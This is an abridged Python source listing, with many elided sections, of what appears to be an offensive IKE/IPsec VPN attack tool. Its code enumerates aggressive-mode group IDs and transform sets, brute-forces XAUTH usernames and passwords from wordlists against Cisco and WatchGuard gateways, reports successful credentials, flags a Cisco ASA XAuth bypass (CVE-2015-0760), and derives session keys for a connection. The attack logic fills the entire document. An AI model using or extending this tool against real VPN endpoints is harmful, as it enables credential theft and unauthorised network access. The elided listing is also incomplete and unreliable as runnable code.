...
parser.add_option("-t", "--trans", dest="trans", default=None,
                  help="[OPTIONAL] Transform set: encryption type, hash type, authentication type, dh group (5 1 1 2)",
                  nargs=4, type="int")
parser.add_option("-e", "--enum", dest="enum", default=None, action="store_true", help="Set Enumeration Mode")
parser.add_option("-a", "--all", dest="all", default=None, action="store_true",
                  help="Set Transform Set Enumeration Mode")
parser.add_option("-b", "--brute", dest="brute", default=None, action="store_true", help="Set XAUTH Brute Force Mode")
parser.add_option("-k", "--psk", dest="psk", default=None, type="string",
                  help="Pre Shared Key to be used with Brute Force Mode")
parser.add_option("-i", "--id", dest="id", default=None, type="string",
                  help="ID or group name. To be used with Brute Force Mode")
parser.add_option("-u", "--username", dest="username", default=None, type="string",
                  help="XAUTH username to be used with Brute Force Mode")
parser.add_option("-U", "--userlist", dest="userlist", default=None, type="string",
                  help="[OPTIONAL] XAUTH username list to be used with Brute Force Mode")
parser.add_option("-p", "--password", dest="password", default=None, type="string",
                  help="XAUTH password to be used with Connect Mode")
...
parser.add_option("-c", "--connect", dest="connect", default=None, action="store_true",
                  help="Set Connect Mode (test a connection)")
parser.add_option("-y", "--idtype", dest="idtype", default=None, type="int",
                  help="[OPTIONAL] ID Type for Identification payload. Default is 2 (FQDN)")
parser.add_option("-s", "--speed", dest="speed", default=3, type="int",
                  help="[OPTIONAL] Speed of guessing attempts. A numerical value between 1 - 5 where 1 is faster and 5 is slow. Default is 3")
parser.add_option("-l", "--keylen", dest="keylen", default=None, type="int",
                  help="[OPTIONAL] Key Length, for use with AES encryption types")
parser.add_option("-v", "--vendor", dest="vendor", default=None, type="string",
                  help="[OPTIONAL] Vendor Type (cisco or watchguard currently accepted)")
parser.add_option("--version", dest="version", default=None, type="int",
                  help="[OPTIONAL] IKE verison (default verison 1)")
...
if enum == True:
    ...
    if userlist != None:
        ...
        print(
            "[+]Single user provided - brute forcing passwords for user: %s\nPress return for a status update" % username)
            ...
            if all:
                ...
                for i in itertools.product(ikeneg.dicEType, ikeneg.dicHType, ikeneg.dicAType, DHGroups):
                    ...
                    if len(packets) == 0:
                        ...
                        initDict = ikeneg.main(iCookie, rCookie, encType, hashType, authType, DHGroup, IDdata, "00",
                                               targetIP, idType, sport, keyLen)
                        dicCrypto = initDict
                        if debug > 0:
                    ...
                    if len(packets) == 1:
                        ...
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                            ...
                            if debug > 0:
                                print(
                                    "Packet received does not match this session, this is probably from a previous incarnation.")
                        ...
                        if respDict["xType"] == 5:
                            if int(respDict["notmsgType"]) == 14:
                                if debug > 0:
                                    print("[-] Notify Message Received: %s" % ikeHandling.dicNotType[
                                        str(respDict["notmsgType"])])
                            ...
                            print(
                                "| %s : %s | %s : %s | %s : %s | %s : %s |\n--------------------------------------------------------------------------------------------" % (
                                    i[0], ikeneg.dicEType[i[0]], i[1], ikeneg.dicHType[i[1]], i[2],
                                    ikeneg.dicAType[i[2]], i[3], dicDHGroup[i[3]]))
                            del packets[:]
                            continue
                ...
                if len(packets) == 0:
                    ...
                    if len(packets) == 0:
                        ...
                        enumType = "Generic"
                        print(
                            "[+]Using Generic enumeration technique. Where no initial response is received for an incorrect ID and the handshake is continued if correct")
                        input(
                            "[+]WARNING - This method is the least reliable, the device may genuinely not accept aggressive mode connections.\nHowever, some devices do allow enumeration in this way - Watchguard devices for example. Note that these devices use ID type 3 not the default of 2. Set with -y 3.\n[+]Press return to accept and continue.\n")
                            ...
                            for w in wordsfile:
                                ...
                                if len(packets) == 0:  # do we actually need this prob not?
                                    ...
                                    if debug > 0:
                                        print(
                                            "\n--------------------Sending first Aggressive Mode packet with ID: %s--------------------" % IDdata)
                                    initDict = ikeneg.main(iCookie, rCookie, encType, hashType, authType, DHGroup,
                                                           IDdata, "00", targetIP, idType, sport, keyLen)
                                    dicCrypto = dict(list(initDict.items()))
                                    time.sleep(speed)
                                    ...
                                    if len(packets) == 1:
                                        ...
                                        if dicCrypto["xType"] == 4:
                                            ...
                                            print(
                                                "However, a notification payload was received. This may be due to an invalid Transform Set or other error. To be sure try a connection with a valid Transform Set.")
                                            time.sleep(2)
                                            exit()
                            ...
                            for w in wordsfile:
                                ...
                                if len(packets) == 0:  # do we actually need this prob not?
                                    ...
                                    try:
                                        ...
                                        if debug > 0:
                                            print(
                                                "[*] Potential Correct ID Found: %s. However this Group/ID probably does not have a PSK associated with it and the handshake will not complete. Continuing...\n" % IDdata)
                                        pass
                            print("[-]ID not found, try another wordlist. Exiting...\n")
                            time.sleep(2)
                            exit()
                        ...
                        while len(packets) <= 2:
                            for w in wordsfile:
                                ...
                                if len(packets) == 0:  # do we actually need this prob not?
                                    ...
                                    if len(packets) < 1:
                                        ...
                                        if len(packets) < 1:
                                            if debug > 0:
                                                print(
                                                    "[*] Potential Correct ID Found: %s. However this Group/ID does not have a PSK associated with it. Continuing...\n" % IDdata)
                                            continue
                                    else:
                                        pass
                                ...
                                if len(packets) == 1:
                                    ...
                                    skeyid = ikeCrypto.calcSKEYID(psk, bytes.fromhex(nonce_i), bytes.fromhex(nonce_r),
                                                                  hashType)
                                    hash_i = ikeCrypto.calcHASH(skeyid, bytes.fromhex(DHPubKey_r),
                                                                bytes.fromhex(DHPubKey_i), bytes.fromhex(rCookie),
                                                                bytes.fromhex(iCookie), bytes.fromhex(SA_i),
                                                                bytes.fromhex(ID_r), bytes.fromhex(ID_i), "i", hashType)
                                    hash_r = ikeCrypto.calcHASH(skeyid, bytes.fromhex(DHPubKey_r),
                                                                bytes.fromhex(DHPubKey_i), bytes.fromhex(rCookie),
                                                                bytes.fromhex(iCookie), bytes.fromhex(SA_i),
                                                                bytes.fromhex(ID_r), bytes.fromhex(ID_i), "r", hashType)
                                    skeyid_d = ikeCrypto.calcSKEYID_d(skeyid, bytes.fromhex(hexSecret),
                                                                      bytes.fromhex(iCookie), bytes.fromhex(rCookie),
                                                                      hashType)
                                    skeyid_a = ikeCrypto.calcSKEYID_a(skeyid, skeyid_d, bytes.fromhex(hexSecret),
                                                                      bytes.fromhex(iCookie), bytes.fromhex(rCookie),
                                                                      hashType)
                                    skeyid_e = ikeCrypto.calcSKEYID_e(skeyid, skeyid_a, bytes.fromhex(hexSecret),
                                                                      bytes.fromhex(iCookie), bytes.fromhex(rCookie),
                                                                      hashType)
                                    if len(skeyid_e) < keyLen:
                                        ...
                                        if debug > 0:
                                            print("Encryption Key: %s" % encKey.hex())
                                    initIV = ikeCrypto.calcIV(bytes.fromhex(DHPubKey_i), bytes.fromhex(DHPubKey_r),
                                                              IVlen, hashType)
                                    ...
                                    arrayHDR = ikeneg.ikeHeader("08", iCookie, rCookie, version, flags, xType, msgID,
                                                                bytesencPayload.hex())  # next payload is always hash (08)
                                    lenHDR = len(arrayHDR)
                                    ...
                                    dicCrypto["lastBlock"] = bytesIKE.hex()[
                                        -IVlen:]  # phase 2 IV and last block are the same at this point
                                    time.sleep(speed)
                                if len(packets) > 1:
                                    ...
                                    try:
                                        if ikeHDR[5] == dicCrypto["msgID"]:
                                            ...
                                            curIV = bytes.fromhex(dicCrypto["lastBlock"])
                                            pass
                                        else:
                                            if debug > 0:
                                                print("Message ID has changed, recalculating IV")
                                            msgID = ikeHDR[5]
                                            curIV = ikeCrypto.calcIV(bytes.fromhex(dicCrypto["p2IV"]),
                                                                     bytes.fromhex(msgID), IVlen, hashType)
                                            pass
                                    except:
                                        print(
                                            "Invalid Message ID, too many concurrent sessions running. Wait 30 seconds and try again.\nExiting")
                                        exit()

                                    # Parse full packet
                                    respDict, listVIDs = ikeHandling.main(packets[-1], encType, hashType, encKey,
                                                                          initIV, curIV)
                                    # Update state/crypto dictionary
                                    dicCrypto.update(respDict)
                        ...
                        while passcount < wordcount:
                            if len(packets) == 0:
                                ...
                                try:
                                    ...
                                    rCookie = "0000000000000000"
                                initDict = ikeneg.main(iCookie, rCookie, encType, hashType, authType, DHGroup, IDdata,
                                                       "00", targetIP, idType, sport, keyLen)
                                time.sleep(speed)
                                if len(packets) == 0:
                            ...
                            if len(packets) == 1:
                                ...
                                if ikeHDR[4] == 5:
                                    try:
                                        respDict, vidHolder = ikeHandling.main(packets[-1], encType, hashType, encKey,
                                                                               initIV, curIV)
                                    except:
                                        respDict, vidHolder = ikeHandling.main(packets[-1], encType, hashType)
                                    print(
                                        "Informational packet received. Enable full debugging for more info. Exiting...")
                                    time.sleep(2)
                                    exit()
                                else:
                                    pass
                                ...
                                ikeDH = dh.DiffieHellman(DHGroup)
                                secret = ikeDH.genSecret(privKey, int(DHPubKey_r, 16))
                                hexSecret = '{0:x}'.format(
                                    secret)  # using new formating to deal with long int, if this fails fallback to old style
                                if len(hexSecret) % 2 != 0:
                                    hexSecret = "0" + hexSecret
                                if debug > 0:
                                    print("Secret: %s" % secret)
                                ...
                                if len(skeyid_e) < keyLen:
                                    ...
                                    if debug > 0:
                                        print("Encryption Key: %s" % encKey.hex())
                                initIV = ikeCrypto.calcIV(bytes.fromhex(DHPubKey_i), bytes.fromhex(DHPubKey_r), IVlen,
                                                          hashType)
                                ...
                                dicCrypto["p2IV"] = bytesIKE.hex()[-IVlen:]
                                dicCrypto["lastBlock"] = bytesIKE.hex()[
                                    -IVlen:]  # p2IV and last block are the same at this point
                                while len(packets) < 2:
                                    time.sleep(0.5)
                            ...
                            if len(packets) == 2:
                                ...
                                try:
                                    if ikeHDR[5] == dicCrypto["msgID"]:
                                        ...
                                        if debug > 0:
                                            print("Message ID has changed, recalculating IV")
                                        msgID = ikeHDR[5]
                                        curIV = ikeCrypto.calcIV(bytes.fromhex(dicCrypto["p2IV"]), bytes.fromhex(msgID),
                                                                 IVlen, hashType)
                                        pass
                                except:
                                    print(
                                        "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting")
                                    time.sleep(2)
                                    exit()
                                ...
                                # Parse full packet
                                respDict, vidHolder = ikeHandling.main(packets[-1], encType, hashType, encKey, initIV,
                                                                       curIV)
                                # Update state/crypto dictionary
                                dicCrypto.update(respDict)
                                ...
                                for w in wordsfile:
                                    ...
                                    if debug > 0:
                                        print(
                                            "\n--------------------Sending third packet - Encrypted XAUTH reply (username: %s password: %s)--------------------" % (
                                                username, password))
                                    ...
                                    mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, bytes.fromhex(msgID), bytesMCFG,
                                                                      hashType)
                                    if debug > 0:
                                        print("Mode Config Hash = %s" % mcfgHash)
                                    arrayHash = ikeneg.ikeHash("0e",
                                                               mcfgHash)  # next payload 0e(14) - Mode Config Attributes
                                    lenHash = len(arrayHash)
                                    bytesHash = struct.pack(("B" * lenHash), *arrayHash)
                                    ...
                                    cipher = ikeCrypto.ikeCipher(encKey, bytes.fromhex(dicCrypto["lastBlock"]), encType)
                                    encPayload = cipher.encrypt(plainPayload)
                                    ...
                                    if len(packets) == 3:
                                        ...
                                        respDict, vidHolder = ikeHandling.main(packets[-1], encType, hashType, encKey,
                                                                               initIV, curIV)
                                        # Update state/crypto dictionary
                                        dicCrypto = dict(list(dicCrypto.items()) + list(respDict.items()))
                                        dicCrypto["lastBlock"] = packets[-1][-IVlen:]
                                        # Pull the useful values from stored dictionary for crypto functions
                                        nonce_i = dicCrypto["nonce_i"]
                                        DHPubKey_i = dicCrypto["DHPubKey_i"]
                                        ...
                                        if int(dicCrypto["mcfgType"]) == 3 and int(dicCrypto["XAUTH_STATUS"]) == 0:
                                            ...
                                            if vendorType == "cisco":
                                                ...
                                                if guessno == 3 and passcount < wordcount:
                                                    ...
                                                    # Hash payload
                                                    arrayHash = ikeneg.ikeHash("0c",
                                                                               hash_i)  # next payload - 12 (delete)
                                                    lenHash = len(arrayHash)
                                                    bytesHash = struct.pack(("B" * lenHash), *arrayHash)
                                                    ...
                                                    arrayencPayload = array.array('B', encPayload)
                                                    lenencPayload = len(arrayencPayload)
                                                    bytesencPayload = struct.pack(("B" * lenencPayload),
                                                                                  *arrayencPayload)

                                                    arrayHDR = ikeneg.ikeHeader("08", iCookie, rCookie, version, flags,
                                                                                xType, msgID,
                                                                                bytesencPayload.hex())  # next payload is always hash (08)
                                                    lenHDR = len(arrayHDR)
                                                    bytesHDR = struct.pack(("B" * lenHDR), *arrayHDR)
                                        ...
                                        if dicCrypto["mcfgType"] == "03" or dicCrypto["mcfgType"] == 3 and int(
                                                dicCrypto["XAUTH_STATUS"]) == 1:
                                            ...
                                            if vendorType == "cisco" and aType == 1 and wordline < 1:
                                                print(
                                                    "[*]Cisco ASA is vulnerable to XAuth authentication bypass (CVE-2015-0760)")
                                                print(
                                                    "Run the tool again in connect (-c) mode to get the full key to use in the ESP connection. This can be used with the Linux IPSec kernel stack in much the same way as the *swans")
                                            else:
                                                print(
                                                    "[*]XAUTH Authentication Successful! Username: %s Password: %s\nSending ACK packet...\n" % (
                                                        username, password))
                                            ...
                                            # Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                            cipher = ikeCrypto.ikeCipher(encKey, bytes.fromhex(dicCrypto["lastBlock"]),
                                                                         encType)
                                            encPayload = cipher.encrypt(plainPayload)
                                            ...
                                            lenencPayload = len(arrayencPayload)
                                            bytesencPayload = struct.pack(("B" * lenencPayload), *arrayencPayload)
                                            arrayHDR = ikeneg.ikeHeader("08", iCookie, rCookie, version, flags, xType,
                                                                        msgID,
                                                                        bytesencPayload.hex())  # next payload is always hash (08)
                                            lenHDR = len(arrayHDR)
                                            bytesHDR = struct.pack(("B" * lenHDR), *arrayHDR)
                                        ...
                                        if dicCrypto["mcfgType"] == "03" or dicCrypto["mcfgType"] == 3 and int(
                                            ...
                                            if ikeHDR[4] == 5:
                                                print(
                                                    "Informational packet received. Enable full debugging for more info. Exiting...")
                                                try:
                                                    respDict, vidHolder = ikeHandling.main(packets[-1], encType,
                                                                                           hashType, encKey, initIV,
                                                                                           curIV)
                                                except:
                                                    respDict, vidHolder = ikeHandling.main(packets[-1], encType,
                                                                                           hashType)
                ...
                # Else use a single user
                    ...
                    while passcount < wordcount:
                        ...
                        if len(packets) == 1:
                            ...
                            skeyid = ikeCrypto.calcSKEYID(psk, bytes.fromhex(nonce_i), bytes.fromhex(nonce_r), hashType)
                            hash_i = ikeCrypto.calcHASH(skeyid, bytes.fromhex(DHPubKey_r), bytes.fromhex(DHPubKey_i),
                                                        bytes.fromhex(rCookie), bytes.fromhex(iCookie),
                                                        bytes.fromhex(SA_i), bytes.fromhex(ID_r), bytes.fromhex(ID_i),
                                                        "i", hashType)
                            hash_r = ikeCrypto.calcHASH(skeyid, bytes.fromhex(DHPubKey_r), bytes.fromhex(DHPubKey_i),
                                                        bytes.fromhex(rCookie), bytes.fromhex(iCookie),
                                                        bytes.fromhex(SA_i), bytes.fromhex(ID_r), bytes.fromhex(ID_i),
                                                        "r", hashType)
                            skeyid_d = ikeCrypto.calcSKEYID_d(skeyid, bytes.fromhex(hexSecret), bytes.fromhex(iCookie),
                                                              bytes.fromhex(rCookie), hashType)
                            skeyid_a = ikeCrypto.calcSKEYID_a(skeyid, skeyid_d, bytes.fromhex(hexSecret),
                                                              bytes.fromhex(iCookie), bytes.fromhex(rCookie), hashType)
                            skeyid_e = ikeCrypto.calcSKEYID_e(skeyid, skeyid_a, bytes.fromhex(hexSecret),
                                                              bytes.fromhex(iCookie), bytes.fromhex(rCookie), hashType)
                            if len(skeyid_e) < keyLen:
                                encKey = ikeCrypto.calcKa(skeyid_e, keyLen, hashType)
                        ...
                        if len(packets) == 2:
                            ...
                            if ikeHDR[1] == dicCrypto["iCookie"]:
                                ...
                                if debug > 0:
                                    print(
                                        "Packet received does not match this session, this is probably from a previous incarnation.1")
                                    print("Removing packet")
                                del packets[-1]
                                continue
                            ...
                            for w in wordsfile:
                                ...
                                # Mode Config Hash payload
                                skeyid_a = dicCrypto["skeyid_a"]
                                mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, bytes.fromhex(msgID), bytesMCFG, hashType)
                                if debug > 0:
                                    print("Mode Config Hash = %s" % mcfgHash)
                                arrayHash = ikeneg.ikeHash("0e",
                                                           mcfgHash)  # next payload 0e(14) - Mode Config Attributes
                                ...
                                if len(packets) >= 3:
                                    ...
                                    if ikeHDR[1] == dicCrypto["iCookie"]:
                                        ...
                                        if debug > 0:
                                            print(
                                                "Packet received does not match this session, this is probably from a previous incarnation.2")
                                            print("Removing packet")
                ...
                if len(packets) == 1:
                    ...
                    if ikeHDR[1] == dicCrypto["iCookie"]:
                        ...
                        if debug > 0:
                            print(
                                "Packet received does not match this session, this is probably from a previous incarnation.4")
                            print("Removing packet")
                        del packets[0]
                        continue
                    ...
                    skeyid = ikeCrypto.calcSKEYID(psk, bytes.fromhex(nonce_i), bytes.fromhex(nonce_r), hashType)
                    hash_i = ikeCrypto.calcHASH(skeyid, bytes.fromhex(DHPubKey_r), bytes.fromhex(DHPubKey_i),
                                                bytes.fromhex(rCookie), bytes.fromhex(iCookie), bytes.fromhex(SA_i),
                                                bytes.fromhex(ID_r), bytes.fromhex(ID_i), "i", hashType)
                    hash_r = ikeCrypto.calcHASH(skeyid, bytes.fromhex(DHPubKey_r), bytes.fromhex(DHPubKey_i),
                                                bytes.fromhex(rCookie), bytes.fromhex(iCookie), bytes.fromhex(SA_i),
                                                bytes.fromhex(ID_r), bytes.fromhex(ID_i), "r", hashType)
                    ...
                    if len(skeyid_e) < keyLen:
                        ...
                        if debug > 0:
                            print("Encryption Key: %s" % encKey.hex())
                    initIV = ikeCrypto.calcIV(bytes.fromhex(DHPubKey_i), bytes.fromhex(DHPubKey_r), IVlen, hashType)
                    ...
                    arrayIKE = ikeneg.ikeHeader("08", iCookie, rCookie, version, flags, xType, msgID,
                                                bytesencPayload.hex())  # next payload is always hash (08)
                    ...
                    while len(packets) < 2:
                        ...
                        if count > 15:
                            ...
                            # Transform payload
                            arrayTrans = ikeneg.ikeTransform(encType, "01", authType, DHGroup, "01", "00007080",
                                                             transID, phase, "00")
                            ...
                            mcfgIP = bytes.fromhex(str(dicCrypto["MCFG_IPi"]))
                            # mcfgIP = "c0a801eb".decode('hex')

                            # ID payload
                            arrayID, ID_i = ikeneg.ikeID(mcfgIP.hex(), "01", "0000", "00",
                                                         "05")  # next payload = ID (5), 0000 = port
                            bytesID = ikeneg.packPacket(arrayID)

                            # ID payload
                            arrayID1, ID_i1 = ikeneg.ikeID("0000000000000000", "04", "0000", "00",
                                                           "00")  # next payload = none (0), 04 = idtype, 0000 = port # next payload = 0d - vid
                            ...
                            qmData = bytes.fromhex(
                                "")  # 00000000"
                            ...
                            # qmData = plainPayload
                            print(skeyid_a.hex())
                            hash_1 = ikeCrypto.calcHASHQM(skeyid_a, bytes.fromhex(msgID), qmData, hashType, 1)
                            arrayHash = ikeneg.ikeHash("01", hash_1)  # next payload 01
                            bytesHash = ikeneg.packPacket(arrayHash)

                            # Encrypt everything but the header
                            curIV = ikeCrypto.calcIV(bytes.fromhex(p2IV), bytes.fromhex(msgID), IVlen, hashType)
                            ...
                            hash_3 = ikeCrypto.calcHASHQM(skeyid_a, bytes.fromhex(msgID), bytes.fromhex(nonces),
                                                          hashType, 3)
                            ...
                            arrayIKE = ikeneg.ikeHeader("08", iCookie, rCookie, version, flags, xType, msgID,
                                                        bytesencPayload.hex())  # next payload 0 = none
                            bytesIKE = ikeneg.packPacket(arrayIKE)
                            ...
                            p2key = ikeCrypto.calcKEYMAT(hashType, keyLen, skeyid_d, bytes.fromhex(prot),
                                                         bytes.fromhex(spi), bytes.fromhex(nonce),
                                                         bytes.fromhex(nonce_r))
                            while len(packets) < 6:
                                time.sleep(0.01)
                                count += 1
                                if count > 7080:
                            ...
                            if ikeHDR[4] == 5:
                                ...
                                if int(dicCrypto["notmsgType"]) == 36136:
                                    ...
                                    arrayIKE = ikeneg.ikeHeader("0b", iCookie, rCookie, version, flags, xType, msgID,
                                                                bytesencPayload.hex())
                                    bytesIKE = ikeneg.packPacket(arrayIKE)
                ...
                if len(packets) == 2:
                    ...
                    if ikeHDR[1] == dicCrypto["iCookie"]:
                        ...
                        print(
                            "Packet received does not match this session, this is probably from a previous incarnation.5")
                        del packets[-1]
                        print(len(packets))
                        print(packets[-1])
                        print("Removing packet")
                    ...
                    try:
                        if ikeHDR[5] == dicCrypto["msgID"]:
                            ...
                            if debug > 0:
                                print("Message ID has changed, recalculating IV")
                            msgID = ikeHDR[5]
                            curIV = ikeCrypto.calcIV(bytes.fromhex(dicCrypto["p2IV"]), bytes.fromhex(msgID), IVlen,
                                                     hashType)
                            pass
                    except:
                        print(
                ...
                if len(packets) == 3:
                    ...
                    if ikeHDR[1] == dicCrypto["iCookie"]:
                        ...
                        print(
                            "Packet received does not match this session, this is probably from a previous incarnation.6")
                        del packets[-1]
                        print("Removing packet")
                        continue
                    ...
                    if dicCrypto["mcfgType"] == "03" or int(dicCrypto["mcfgType"]) == 3 and int(
                            dicCrypto["XAUTH_STATUS"]) == 1:
                        print(
                            "[*]XAUTH Authentication Successful! Username: %s Password: %s\nSending ACK packet...\n" % (
                                username, password))
                    ...
                    if dicCrypto["mcfgType"] == "03" or int(dicCrypto["mcfgType"]) == 3 and int(
                        ...
                        if debug > 0:
                            print(
                                "\n--------------------Sending fourth packet - Encrypted XAUTH ACK (username: %s password: %s)--------------------" % (
                                    username, password))
                        xType = "06"  # Mode Config transation
                        # Hash Payload
                        skeyid_a = dicCrypto["skeyid_a"]
                ...
                if len(packets) == 4:
                    ...
                    # Transform payload
                    arrayTrans = ikeneg.ikeTransform(encType, "01", authType, DHGroup, "01", "00007080", transID, phase,
                                                     "00")
                    bytesTrans = ikeneg.packPacket(arrayTrans)
                    # Proposal Payload
                    arrayProposal = ikeneg.ikeProposal(bytesTrans.hex(), "02", phase)
                    ...
                    # SA_i = arraySA[2:]
                    SA_i = bytesSA.hex()[8:]
                    bytesSA_i = bytes.fromhex(SA_i)

                    arrayNonce, nonce = ikeneg.ikeNonce("0d")
                    bytesNonce = ikeneg.packPacket(arrayNonce)

                    # Pull IP from previous Mode CFG transaction
                    mcfgIP = bytes.fromhex(dicCrypto["MCFG_IPi"])
                    # mcfgIP = "c0a801eb".decode('hex')
                ...
                if len(packets) == 5:
                    ...
                    if ikeHDR[1] == dicCrypto["iCookie"]:
                        ...
                        print(
                            "Packet received does not match this session, this is probably from a previous incarnation.7")
                        del packets[-1]
                        print("Removing packet")
                        continue
                    ...
                    nonce_r = dicCrypto["nonce_r"]
                    nonces = nonce + nonce_r
                    hash_3 = ikeCrypto.calcHASHQM(skeyid_a, bytes.fromhex(msgID), bytes.fromhex(nonces), hashType, 3)
                    arrayHash = ikeneg.ikeHash("00", hash_3)  # next payload 00
                    bytesHash = ikeneg.packPacket(arrayHash)
                    ...
                    print("|Encryption Type: %s                                      |" % dicCrypto["Encryption Type"])
                    print("|Authentication Algorithm: %s                              |" % dicCrypto[
                        "Authentication Algorithm"])
                    print(
                        "|SA Life Duration: %s                                      |" % dicCrypto["SA Life Duration"])
                    print("|SA Life Type: %s                                                 |" % dicCrypto[
                        "SA Life Type"])

                    p2key = ikeCrypto.calcKEYMAT(hashType, keyLen, skeyid_d, bytes.fromhex(prot), bytes.fromhex(p2spi),
                                                 bytes.fromhex(nonce), bytes.fromhex(nonce_r))
